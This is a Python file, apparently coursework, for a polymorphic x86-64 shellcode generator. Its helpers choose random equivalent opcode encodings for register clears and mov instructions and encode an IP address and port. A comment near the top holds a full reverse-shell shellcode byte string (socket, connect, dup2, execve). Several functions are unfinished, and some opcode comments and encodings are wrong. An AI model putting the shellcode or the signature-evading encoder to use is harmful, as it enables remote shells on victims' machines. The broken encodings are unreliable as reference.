import random
import socket


# using objdump on my asm reverse shell executable i got this :
#       objdump -d ./executable|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr│
#       -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|se│
#       d 's/$/"/g' 

# my_code = "\xb8\x29\x00\x00\x00\xbf\x02\x00\x00\x00\xbe\x01\x00\x00\x00\xba\x06\x00\x00\x00\x0f\x05\x50\xeb\x00\xb8\x2a\x00\x00\x00\x5f\x57\x48\xbe\x00\x20\x40\x00\x00\x00\x00\xba\x10\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\x5f\x57\xbe\x00\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\x5f\x57\xbe\x01\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\x5f\x57\xbe\x02\x00\x00\x00\x0f\x05\xeb\x00\xb8\x3b\x00\x00\x00\x48\xbf\x08\x20\x40\x00\x00\x00\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\xb8\x3c\x00\x00\x00\x48\x31\xff\x0f\x05"
# print(my_code)

#---------------------------------------------------------------------------------------------------------------------
#----------------------------------------CONVERSION FUNCTIONS---------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------


def decimal_to_hex(decimal_value):
    hex_value = hex(decimal_value)[2:]  # Convert to hexadecimal and remove '0x' prefix
    return '0x' + hex_value




def decimal_to_hex_port(port_number_decimal):
    # Convert decimal port number to network byte order (little-endian) in hexadecimal format
    port_number_hex = socket.htons(port_number_decimal)
    return port_number_hex


def ip_to_hex_with_format(ip_address):
    # Split the IP address into its four octets
    octets = ip_address.split('.')

    # Reverse the order of the octets
    reversed_octets = octets[::-1]

    # Convert each octet to its hexadecimal representation
    hex_octets = [format(int(octet), '02X') for octet in reversed_octets]

    # Concatenate the hexadecimal octets and add the '0x' prefix
    hex_value = '0x' + ''.join(hex_octets)

    return hex_value

# Example usage:


print(ip_to_hex_with_format("128.5.5.2"))
print(ip_to_hex_with_format("1.5.5.1"))
print(ip_to_hex_with_format("127.0.0.1"))







#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------


def int_to_hex_and_bits(integer_value):
    # Convert the integer to hexadecimal representation
    hex_value = hex(integer_value)[2:].upper()

    # Make sure the hex number has an even number of digits by adding leading zeros if needed
    if len(hex_value) % 2 != 0:
        hex_value = "0" + hex_value

    # Insert spaces between each two digits
    hex_value_with_spaces = ' '.join(hex_value[i:i+2] for i in range(0, len(hex_value), 2))

    # Reverse the order of the bytes to represent in little-endian format
    little_endian_hex = ' '.join(hex_value_with_spaces.split()[::-1])

    # Calculate the length of the integer in bits
    bit_length = integer_value.bit_length()

    return little_endian_hex, bit_length


# Example usage:
# integer_value = 305419896
# little_endian_hex, bits = int_to_hex_and_bits(integer_value)
# print("Decimal: {0}, Hexadecimal (Little-endian): {1}, Length in Bits: {2}".format(integer_value, little_endian_hex, bits))



#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------






# A function that takes the register clears it
def clear_rax():
    list_ = ["4831C0", "4831D24889D0"]
    return random.choice(list_)


def clear_rdi():
    list_ = ["4831FF","4831C04889C7"]
    return random.choice(list_)


def clear_rsi():
    list_ = ["4831F6","4831D24889D6"]
    return random.choice(list_)


def clear_rdx():
    list_ = ["4831D2","4831FF4889FA"]
    return random.choice(list_)

#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------








#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------RAX----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------

# mov rax, rdi = 48 89 f8 
def mov_rax_rdi():
    list_ = ["48 89 f8"]
# mov rax, rsi = 48 89 f0 
def mov_rax_rsi():
    list_ = ["48 89 f0"]
# mov rax, rdx = 48 89 d0
def mov_rax_rdx():
    list_ = ["48 89 d0"]
# mov rax, rax = 48 89 c0
def mov_rax_rax():
    list_ = ["48 89 c0"]


def mov_rax_valeur(value):
    little_endian_hex, bits = int_to_hex_and_bits(value)
    #  mov RAX, ( an integer > 32 and =< 64 bits ) |||||| 48 c7 c0 XX XX XX XX
    if (bits > 32 and bits <= 64):
        opcode = "48 c7 c0"
        list_ = [opcode + " " + little_endian_hex]
    #####  mov EAX, ( an integer > 16 and =< 32 bits ) |||||| b8 XX XX XX XX
    elif (bits > 16 and bits <= 32):
        opcode = "b8"
        list_ = [opcode + " " + little_endian_hex]
    ##########  mov AX, (an integer > 8 and =< 16 bits ) |||||| 66 b8 XX XX
    elif (bits > 8 and bits <= 16):
        opcode = "66 b8"
        list_ = [opcode + " " + little_endian_hex]
    ###############  mov AL, (an integer =< 8 bits ) ||||||= b0 XX
    elif (bits >= 0 and bits <= 8):
        opcode = "b0"
        list_ = [opcode + " " + little_endian_hex]
    return random.choice(list_)



#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------RDI----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------



# mov rdi, rdi = 48 89 f8 
def mov_rdi_rdi():
    list_ = ["48 89 ff"]
# mov rdi, rsi = 48 89 f0 
def mov_rdi_rsi():
    list_ = ["48 89 f7"]
# mov rdi, rdx = 48 89 d0
def mov_rdi_rdx():
    list_ = ["48 89 d7"]
# mov rdi, rax = 48 89 c0
def mov_rdi_rax():
    list_ = ["48 89 c7"]




def mov_rdi_valeur(value):
    little_endian_hex, bits = int_to_hex_and_bits(value)
    #  mov RDI, ( an integer > 32 and =< 64 bits ) |||||| 48 c7 c7 XX XX XX XX
    if (bits > 32 and bits <= 64):
        opcode = "48 c7 c7"
        list_ = [opcode + " " + little_endian_hex]
    #####  mov EDI, ( an integer > 16 and =< 32 bits ) |||||| bf XX XX XX XX
    elif (bits > 16 and bits <= 32):
        opcode = "bf"
        list_ = [opcode + " " + little_endian_hex]
    ##########  mov DI, (an integer > 8 and =< 16 bits ) |||||| 66 bf XX XX
    elif (bits > 8 and bits <= 16):
        opcode = "66 bf"
        list_ = [opcode + " " + little_endian_hex]
    ###############  mov DIL, (an integer =< 8 bits )  |||||| 40 b7 XX
    elif (bits >= 0 and bits <= 8):
        opcode = "40 b7"
        list_ = [opcode + " " + little_endian_hex]
    return random.choice(list_)




#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------RSI----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------




# mov rsi, rdi = 48 89 fe 
def mov_rsi_rdi():
    list_ = ["48 89 fe"]
# mov rsi, rsi = 48 89 f6
def mov_rsi_rsi():
    list_ = ["48 89 f6"]
# mov rsi, rdx = 48 89 d6
def mov_rsi_rdx():
    list_ = ["48 89 d6"]
# mov rsi, rax = 48 89 c6
def mov_rsi_rax():
    list_ = ["48 89 c6"]



def mov_rsi_valeur(value):
    little_endian_hex, bits = int_to_hex_and_bits(value)
    #  mov RSI, ( an integer > 32 and =< 64 bits ) |||||| 48 C7 C6 XX XX XX XX
    if (bits > 32 and bits <= 64):
        opcode = "48 c7 c6"
        list_ = [opcode + " " + little_endian_hex]
    #####  mov ESI, ( an integer > 16 and =< 32 bits ) |||||| BE XX XX XX XX
    elif (bits > 16 and bits <= 32):
        opcode = "be"
        list_ = [opcode + " " + little_endian_hex]
    ##########  mov SI, (an integer > 8 and =< 16 bits ) |||||| 66 BE XX XX
    elif (bits > 8 and bits <= 16):
        opcode = "66 be"
        list_ = [opcode + " " + little_endian_hex]
    ###############  mov SIL, (an integer =< 8 bits ) |||||| 40 b6 XX
    elif (bits >= 0 and bits <= 8):
        opcode = "40 b6"
        list_ = [opcode + " " + little_endian_hex]
    return random.choice(list_)


#---------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------RDX----------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------



# mov rdx, rdi = 48 89 fa
def mov_rdx_rdi():
    list_ = ["48 89 fa"]
# mov rdx, rsi = 48 89 f2
def mov_rdx_rsi():
    list_ = ["48 89 f2"]
# mov rdx, rdx = 48 89 d2
def mov_rdx_rdx():
    list_ = ["48 89 d2"]
# mov rdx, rax = 48 89 c2
def mov_rdx_rax():
    list_ = ["48 89 c2"]


def mov_rdx_valeur(value):
    little_endian_hex, bits = int_to_hex_and_bits(value)
    #  mov RDX, ( an integer > 32 and =< 64 bits ) |||||| 48 C7 C2 XX XX XX XX
    if (bits > 32 and bits <= 64):
        opcode = "48 c7 c2"
        list_ = [opcode + " " + little_endian_hex]
    #####  mov EDX, ( an integer > 16 and =< 32 bits ) |||||| BA XX XX XX XX
    elif (bits > 16 and bits <= 32):
        opcode = "ba"
        list_ = [opcode + " " + little_endian_hex]
    ##########  mov DX, (an integer > 8 and =< 16 bits ) |||||| 66 BA XX XX
    elif (bits > 8 and bits <= 16):
        opcode = "66 ba"
        list_ = [opcode + " " + little_endian_hex]
    ###############  mov DL, (an integer =< 8 bits ) |||||| B2 XX
    elif (bits >= 0 and bits <= 8):
        opcode = "b2"
        list_ = [opcode + " " + little_endian_hex]
    return random.choice(list_)







# print(decimal_to_hex(256))
# print(decimal_to_hex_port(1337))



#### exemple du prof pour sys_exit

# mov al,06 : b0 3c
# mov al, 99, sub al, 39
# mov al, 30 ; add al, 30
# mov 







